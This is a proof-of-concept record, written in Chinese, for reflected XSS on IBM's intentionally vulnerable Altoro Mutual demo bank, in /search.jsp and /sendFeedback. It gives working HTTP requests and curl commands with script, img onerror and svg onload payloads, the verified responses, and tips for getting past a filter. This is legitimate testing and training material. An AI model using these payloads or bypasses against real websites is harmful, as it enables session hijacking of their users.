# IBM Altoro Mutual 演示银行 (demo.testfire.net) /search.jsp query 参数反射型 XSS，/sendFeedback name 字段 POST 型回显 XSS

- **code**: testfire-altoro-search-jsp-query-reflected-xss
- **kind**: poc
- **category**: auth-bypass
- **component**: IBM Altoro Mutual 演示银行 (testfire.net / AltoroJ)
- **severity**: medium
- **language**: http
- **source**: manual
- **verified**: 1
- **verified_note**: task#643，2026-11-08 11:32 UTC 从本机直连 http://demo.testfire.net 用 curl.exe 实测 4 组 payload，全部成立：① GET /search.jsp?query=%3Cscript%3Ealert(1)%3C/script%3E → HTTP/1.1 200，响应第 103 行为 `<script>alert(1)</script>` 原样；② query=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C!-- → 第 103 行 `"><img src=x onerror=alert(document.domain)><!--`；③ query=a%22%3E%3Csvg%20onload%3Dalert(21)%3E → `a"><svg onload=alert(21)>`；④ POST /sendFeedback 带 name=<script>alert(12)</script> → 200，响应 `<p>Thank you for your comments, <script>alert(12)</script>.` 原样回显。判定成立依据：payload 逐字节出现在 HTML 文本节点中，未出现 &lt;/&quot; 等实体化，且落在可执行上下文。原始响应存于任务工作目录 i12514 下 search_output encoding validation1-3.txt / fb_post2.txt。
- **path**: pocs/testfire-altoro-search-jsp-query-reflected-xss/poc.http
- **tags**: xss,reflected-xss,output-encoding,testfire,altoro,ibm,demo-bank,search.jsp,sendFeedback
- **created_at**: 2026-11-08T11:35:00.551Z
- **engine**: http://demo.testfire.net

## 描述

演示银行站点的搜索接口把 query 参数原样拼进响应 HTML 文本节点（"No results were found for the query:" 之后），未做 HTML 实体编码，script / img onerror / svg onload 三种 payload 均原样反射并可在浏览器执行；同一后端 /sendFeedback 的 name 字段在 POST 成功页原样回显，构成 POST 型反射 XSS。无需认证，GET 即可触发，适合做输出编码类漏洞的基线验证与靶场演示。

## 用法

```
1) 基线：`curl -s "http://<host>/search.jsp?query=ARtEX_baseline"` 确认页面含 "No results were found for the query:"，记下该节点位置（本靶为响应第 103 行）。
2) 验证：`curl -s "http://<host>/search.jsp?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -n "alert(1)"` —— 命中且原文为 `<script>alert(1)</script>`（不是 &lt;script&gt;）= 成立。
3) 上下文闭合：`query=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C!--` 用于证明可跳出当前文本节点/属性。
4) 替代标签：`query=a%22%3E%3Csvg%20onload%3Dalert(21)%3E`，用于 script 标签被过滤时的绕过。
5) POST 面：`curl -s -d 'name=<script>alert(12)</script>&email_addr=a@b.c&subject=s&comments=c&cfile=comments.txt&submit=Submit' http://<host>/sendFeedback`，看回显 "Thank you for your comments, <payload>"。
注意：判据是"实体化与否"，不是"有没有弹窗"——纸上验证用 grep 原文即可；要证明可执行再上浏览器/headless。curl 直接看响应，别只看 HTTP 200。
```

## 正文

```
# demo.testfire.net（IBM Altoro Mutual 演示银行）/search.jsp 反射型 XSS

## 漏洞归类
output encoding validation —— query 参数进入 HTML 文本节点前未做实体编码；因可窃取会话 cookie，归入 auth-bypass 大类。

## 前置条件
- 目标可达，`/search.jsp` 无需认证
- 响应头为 `Content-Type: text/html;charset=ISO-8859-1`
- 无需登录、无需 CSRF token（GET 即可）

## 注入点
响应体中固定句式：

```
<p>No results were found for the query:<br /><br />
        <query 参数原样输出>
```

## 复现请求

### 1) 基础验证（script 标签直出）

```http
GET /search.jsp?query=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
```

响应（HTTP/1.1 200 OK）第 103 行原文：

```html
		<script>alert(1)</script>
```

### 2) 闭合上下文 + 事件处理器（script 被过滤时的替代）

```http
GET /search.jsp?query=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C!-- HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
```

响应第 103 行原文：

```html
		"><img src=x onerror=alert(document.domain)><!--
```

### 3) SVG onload 变体

```http
GET /search.jsp?query=a%22%3E%3Csvg%20onload%3Dalert(21)%3E HTTP/1.1
Host: demo.testfire.net
```

响应第 103 行原文：

```html
		a"><svg onload=alert(21)>
```

### 4) POST 型反射面：/sendFeedback 的 name 字段

```http
POST /sendFeedback HTTP/1.1
Host: demo.testfire.net
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

name=<script>alert(12)</script>&email_addr=a@b.c&subject=s&comments=c&cfile=comments.txt&submit=Submit
```

响应（200）原文：

```html
<p>Thank you for your comments, <script>alert(12)</script>.  They will be reviewed by our Customer Service staff ...
```

## 判据
- payload 的 `<` `>` `"` 以**原文**出现在响应 HTML 中（不是 `&lt;` `&quot;`）；
- 出现位置在可执行上下文（文本节点 / 事件属性），而非被引号包裹且已转义的属性值内；
- 用 `grep -n "alert(1)"` 能命中且行内保留尖括号 = 成立。

## 失败时的常见原因
1. 只看 HTTP 200 就下结论 —— 必须看响应体里的实体化情况。
2. 参数名写错（是 `query`，不是 `q`/`search`）；先发基线看固定句式是否出现。
3. WAF 拦 `<script>` —— 换 `<img onerror>` / `<svg onload>` / `<details open ontoggle>`，并检查是否返回拦截页而非业务页。
4. 站点做了重定向（302 到首页）导致丢参 —— 加 `-L` 或用 `--max-redirs 0` 看真实响应码。
5. 使用了 `-I`/HEAD —— 本靶只有 GET 完整响应体才带回显。

## 采集信息
- 验证时间：2026-11-08 11:32 UTC
- 工具：本机 curl.exe 直连
- 原始响应留存：search_output encoding validation1.txt / 2.txt / 3.txt、fb_post2.txt

```
